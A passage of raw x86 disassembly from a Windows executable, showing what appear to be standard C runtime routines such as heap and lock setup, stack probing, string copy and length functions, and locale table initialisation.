  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
